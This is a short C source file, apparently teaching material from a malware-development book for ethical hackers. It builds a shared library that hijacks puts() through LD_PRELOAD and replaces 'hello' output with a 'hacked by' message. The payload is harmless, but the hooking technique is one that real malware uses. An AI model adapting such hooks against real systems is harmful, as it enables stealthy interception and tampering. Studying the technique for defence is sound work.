/*
 * Malware Development for Ethical Hackers 2nd
 * hook.c
 * malicious shared library for 
 * LD_PRELOAD hijacking
 * author: @cocomelonc
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>

static int (*original_puts)(const char *str) = NULL;

__attribute__((constructor))
static void init(void) {
  original_puts = dlsym(RTLD_NEXT, "puts");
}

int puts(const char *str) {
  if (strstr(str, "hello") != NULL) {
    return original_puts("hacked by cocomelonc! meow =^..^=");
  }
  return original_puts(str);
}